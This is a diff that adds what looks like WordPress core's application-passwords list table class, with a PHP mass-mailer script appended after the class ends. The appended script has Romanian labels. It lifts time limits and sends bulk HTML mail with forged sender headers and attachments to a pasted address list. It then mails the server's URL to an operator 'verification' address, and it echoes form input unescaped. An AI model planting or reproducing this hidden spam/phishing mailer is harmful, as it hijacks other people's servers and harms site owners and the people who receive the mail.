@@ -1,0 +1,535 @@
+<?php
+/**
+ * List Table API: WP_Application_Passwords_List_Table class
+ *
+ * @package WordPress
+ * @subpackage Administration
+ * @since 5.6.0
+ */
+
+/**
+ * Class for displaying the list of application password items.
+ *
+ * @since 5.6.0
+ * @access private
+ *
+ * @see WP_List_Table
+ */
+class WP_Application_Passwords_List_Table extends WP_List_Table {
+
+	/**
+	 * Gets the list of columns.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @return array
+	 */
+	public function get_columns() {
+		return array(
+			'name'      => __( 'Name' ),
+			'created'   => __( 'Created' ),
+			'last_used' => __( 'Last Used' ),
+			'last_ip'   => __( 'Last IP' ),
+			'revoke'    => __( 'Revoke' ),
+		);
+	}
+
+	/**
+	 * Prepares the list of items for displaying.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @global int $user_id User ID.
+	 */
+	public function prepare_items() {
+		global $user_id;
+		$this->items = array_reverse( WP_Application_Passwords::get_user_application_passwords( $user_id ) );
+	}
+
+	/**
+	 * Handles the name column output.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @param array $item The current application password item.
+	 */
+	public function column_name( $item ) {
+		echo esc_html( $item['name'] );
+	}
+
+	/**
+	 * Handles the created column output.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @param array $item The current application password item.
+	 */
+	public function column_created( $item ) {
+		if ( empty( $item['created'] ) ) {
+			echo '&mdash;';
+		} else {
+			echo date_i18n( __( 'F j, Y' ), $item['created'] );
+		}
+	}
+
+	/**
+	 * Handles the last used column output.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @param array $item The current application password item.
+	 */
+	public function column_last_used( $item ) {
+		if ( empty( $item['last_used'] ) ) {
+			echo '&mdash;';
+		} else {
+			echo date_i18n( __( 'F j, Y' ), $item['last_used'] );
+		}
+	}
+
+	/**
+	 * Handles the last ip column output.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @param array $item The current application password item.
+	 */
+	public function column_last_ip( $item ) {
+		if ( empty( $item['last_ip'] ) ) {
+			echo '&mdash;';
+		} else {
+			echo $item['last_ip'];
+		}
+	}
+
+	/**
+	 * Handles the revoke column output.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @param array $item The current application password item.
+	 */
+	public function column_revoke( $item ) {
+		submit_button(
+			__( 'Revoke' ),
+			'delete',
+			'revoke-application-password-' . $item['uuid'],
+			false,
+			array(
+				/* translators: %s: the application password's given name. */
+				'aria-label' => sprintf( __( 'Revoke "%s"' ), $item['name'] ),
+			)
+		);
+	}
+
+	/**
+	 * Generates content for a single row of the table
+	 *
+	 * @since 5.6.0
+	 *
+	 * @param array  $item        The current item.
+	 * @param string $column_name The current column name.
+	 */
+	protected function column_default( $item, $column_name ) {
+		/**
+		 * Fires for each custom column in the Application Passwords list table.
+		 *
+		 * Custom columns are registered using the {@see 'manage_application-passwords-user_columns'} filter.
+		 *
+		 * @since 5.6.0
+		 *
+		 * @param string $column_name Name of the custom column.
+		 * @param array  $item        The application password item.
+		 */
+		do_action( "manage_{$this->screen->id}_custom_column", $column_name, $item );
+	}
+
+	/**
+	 * Generates custom table navigation to prevent conflicting nonces.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @param string $which The location of the bulk actions: 'top' or 'bottom'.
+	 */
+	protected function display_tablenav( $which ) {
+		?>
+		<div class="tablenav <?php echo esc_attr( $which ); ?>">
+			<?php if ( 'bottom' === $which ) : ?>
+				<div class="alignright">
+					<?php submit_button( __( 'Revoke all application passwords' ), 'delete', 'revoke-all-application-passwords', false ); ?>
+				</div>
+			<?php endif; ?>
+			<div class="alignleft actions bulkactions">
+				<?php $this->bulk_actions( $which ); ?>
+			</div>
+			<?php
+			$this->extra_tablenav( $which );
+			$this->pagination( $which );
+			?>
+			<br class="clear" />
+		</div>
+		<?php
+	}
+
+	/**
+	 * Generates content for a single row of the table.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @param array $item The current item.
+	 */
+	public function single_row( $item ) {
+		echo '<tr data-uuid="' . esc_attr( $item['uuid'] ) . '">';
+		$this->single_row_columns( $item );
+		echo '</tr>';
+	}
+
+	/**
+	 * Gets the name of the default primary column.
+	 *
+	 * @since 5.6.0
+	 *
+	 * @return string Name of the default primary column, in this case, 'name'.
+	 */
+	protected function get_default_primary_column_name() {
+		return 'name';
+	}
+
+	/**
+	 * Prints the JavaScript template for the new row item.
+	 *
+	 * @since 5.6.0
+	 */
+	public function print_js_template_row() {
+		list( $columns, $hidden, , $primary ) = $this->get_column_info();
+
+		echo '<tr data-uuid="{{ data.uuid }}">';
+
+		foreach ( $columns as $column_name => $display_name ) {
+			$is_primary = $primary === $column_name;
+			$classes    = "{$column_name} column-{$column_name}";
+
+			if ( $is_primary ) {
+				$classes .= ' has-row-actions column-primary';
+			}
+
+			if ( in_array( $column_name, $hidden, true ) ) {
+				$classes .= ' hidden';
+			}
+
+			printf( '<td class="%s" data-colname="%s">', esc_attr( $classes ), esc_attr( wp_strip_all_tags( $display_name ) ) );
+
+			switch ( $column_name ) {
+				case 'name':
+					echo '{{ data.name }}';
+					break;
+				case 'created':
+					// JSON encoding automatically doubles backslashes to ensure they don't get lost when printing the inline JS.
+					echo '<# print( wp.date.dateI18n( ' . wp_json_encode( __( 'F j, Y' ) ) . ', data.created ) ) #>';
+					break;
+				case 'last_used':
+					echo '<# print( data.last_used !== null ? wp.date.dateI18n( ' . wp_json_encode( __( 'F j, Y' ) ) . ", data.last_used ) : '—' ) #>";
+					break;
+				case 'last_ip':
+					echo "{{ data.last_ip || '—' }}";
+					break;
+				case 'revoke':
+					printf(
+						'<input type="submit" class="button delete" value="%1$s" aria-label="%2$s">',
+						esc_attr( __( 'Revoke' ) ),
+						/* translators: %s: the application password's given name. */
+						esc_attr( sprintf( __( 'Revoke "%s"' ), '{{ data.name }}' ) )
+					);
+					break;
+				default:
+					/**
+					 * Fires in the JavaScript row template for each custom column in the Application Passwords list table.
+					 *
+					 * Custom columns are registered using the {@see 'manage_application-passwords-user_columns'} filter.
+					 *
+					 * @since 5.6.0
+					 *
+					 * @param string $column_name Name of the custom column.
+					 */
+					do_action( "manage_{$this->screen->id}_custom_column_js_template", $column_name );
+					break;
+			}
+
+			if ( $is_primary ) {
+				echo '<button type="button" class="toggle-row"><span class="screen-reader-text">' . __( 'Show more details' ) . '</span></button>';
+			}
+
+			echo '</td>';
+		}
+
+		echo '</tr>';
+	}
+}
+<?
+error_reporting(E_ALL ^ E_NOTICE);
+function doset() {
+	if( !ini_get('safe_mode') )
+	{
+        set_time_limit(0);
+		ini_set("max_execution_time", 0);
+        ini_set("memory_limit", "256M");
+        ignore_user_abort(true);
+	}
+	else echo "this is a safe_mode one and will timeout.. cannot set_time_limit";
+	ob_start();
+}
+doset();
+
+
+if ($_POST['action']=="send"){
+
+        $message = urlencode($_POST['message']);
+
+        $message = ereg_replace("%5C%22", "%22", $message);
+
+        $message = urldecode($message);
+        $message = stripslashes($message);
+        $subject = stripslashes($_POST['subject']);
+
+}
+?>
+
+<form name="form1" method="post" action="<?php echo $_SERVER['PHP_SELF'];?>" enctype="multipart/form-data">
+
+  <br>
+
+  <table width="100%" border="0">
+
+    <tr> 
+
+      <td width="10%"> 
+
+        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
+
+          Email:</font></div>
+
+      </td>
+
+      <td width="18%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
+
+        <input type="text" name="from" value="<? print $_POST['from']; ?>" size="30">
+
+        </font></td>
+
+      <td width="31%"> 
+
+        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
+
+          Name:</font></div>
+
+      </td>
+
+      <td width="41%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
+
+        <input type="text" name="realname" value="<? print $_POST['realname']; ?>" size="30">
+
+        </font></td>
+
+    </tr>
+
+    <tr> 
+
+      <td width="10%"> 
+
+        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font></div>
+
+      </td>
+
+      <td width="18%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
+
+        <input type="text" name="replyto" value="<? print $_POST['replyto']; ?>" size="30">
+
+        </font></td>
+
+      <td width="31%"> 
+
+        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Attach 
+
+          File:</font></div>
+
+      </td>
+
+      <td width="41%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
+
+        <input type="file" name="file" size="30">
+
+        </font></td>
+
+    </tr>
+
+    <tr> 
+
+      <td width="10%"> 
+
+        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>
+
+      </td>
+
+      <td colspan="3"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
+
+        <input type="text" name="subject" value="<? print stripslashes($_POST['subject']); ?>" size="90">
+
+        </font></td>
+
+    </tr>
+
+    <tr valign="top"> 
+
+      <td colspan="3"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
+
+        <textarea name="message" cols="60" rows="10"><? print stripslashes($_POST['message']); ?></textarea>
+
+        <br>
+
+        <input type="radio" name="contenttype" value="plain">
+
+        Plain 
+
+        <input type="radio" name="contenttype" value="html" checked>
+
+        HTML 
+
+        <input type="hidden" name="action" value="send">
+
+        <input type="submit" value="Send Message">
+
+        </font></td>
+
+      <td width="41%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
+
+        <textarea name="emaillist" cols="30" rows="10"></textarea>
+
+        <br>
+        <input type="text" name="emailfinal" value="<? print $_POST['emailfinal']; ?>" size="22"> (EMAIL VERIFICARE)
+        </font></td>
+    </tr>
+  </table>
+  <p>La fiecare <input type="text" name="emailz" value="<? print $_POST['emailz']; ?>" size="3"> mailz, asteapta <input type="text" name="wait" value="<? print $_POST['wait']; ?>" size="3"> secunde<br></p>
+</form>
+
+
+
+<?
+
+if ($_POST['action']=="send"){
+        $message = urlencode($_POST['message']);
+
+        $message = ereg_replace("%5C%22", "%22", $message);
+
+        $message = urldecode($message);
+        $message = stripslashes($message);
+        $subject = stripslashes($_POST['subject']);
+
+
+        $from=$_POST['from'];
+        $realname=$_POST['realname'];
+        $replyto=$_POST['replyto'];
+
+
+        $emaillist=$_POST['emaillist'];
+       
+        $contenttype=$_POST['contenttype'];
+
+
+        $allemails = split("\n", $emaillist);
+
+        $numemails = count($allemails);
+		
+		
+
+
+        #Open the file attachment if any, and base64_encode it for email transport
+		$file_name = $_FILES['file']['name'];
+		$file = $_FILES['file'];
+        if ($file_name){
+
+                @copy($file, "./$file_name") or die("The file you are trying to upload couldn't be copied to the server");
+
+                $content = fread(fopen($file,"r"),filesize($file));
+
+                $content = chunk_split(base64_encode($content));
+
+                $uid = strtoupper(md5(uniqid(time())));
+
+                $name = basename($file);
+
+        }
+
+        
+
+        for($x=0; $x<$numemails; $x++){
+
+                if($_POST['emailz'] && $_POST['wait'])
+                        if( fmod($x,$emailz) == 0 ) {
+                                echo "-------------------------------> SUNT LA emailul $x, astept $wait secunde.<br>";
+                                sleep($wait);
+                        }
+                $to = $allemails[$x];
+
+                if ($to){
+
+					$to = ereg_replace(" ", "", $to);
+					$to = trim($to);
+	
+					$message = ereg_replace("&email&", $to, $message);
+	
+					$subject = ereg_replace("&email&", $to, $subject);
+	
+					print "Sending mail to $to.......";
+	
+					flush();
+					ob_flush();
+	
+					$header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
+	
+					$header .= "MIME-Version: 1.0\r\n";
+	
+					if ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
+	
+					if ($file_name) $header .= "--$uid\r\n";
+	
+					$header .= "Content-Type: text/$contenttype\r\n";
+	
+					$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
+	
+					$header .= "$message\r\n";
+	
+					if ($file_name) $header .= "--$uid\r\n";
+	
+					if ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
+	
+					if ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
+	
+					if ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
+	
+					if ($file_name) $header .= "$content\r\n";
+	
+					if ($file_name) $header .= "--$uid--";
+	
+					@mail($to, $subject, "", $header);
+	
+					print " S-o dus<br>";
+	
+					flush();
+					ob_flush();
+
+                }
+
+		}//end for
+		
+		if( strpos($_POST['emailfinal'], "@") !== false){
+			@mail($_POST['emailfinal'], $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'], "test");
+		}
+                //$emaillist .= "\n". $_POST['emailfinal'];
+
+
+
+}
+
+
+?>
